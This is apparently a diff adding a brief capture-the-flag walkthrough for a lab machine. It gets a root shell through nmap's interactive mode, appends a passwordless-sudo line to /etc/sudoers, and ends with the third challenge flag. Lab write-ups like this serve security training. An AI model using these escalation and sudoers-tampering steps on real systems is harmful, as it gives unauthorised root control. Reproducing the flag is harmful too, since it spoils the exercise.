@@ -1,0 +1,7 @@
+step 1 - install nmap then type /usr/local/bin/nmap I--interactive
+
+step 2 - press enter and type !sh
+
+step 3 - echo "robot ALL=(ALL:ALL) NOPASSWD:ALL">>/etc/sudoers and copy the password from which we craked the key 2 password and then go to root and then we get the password
+
+KEY 3 :04787ddef27c3dee1ee161b21670b4e4
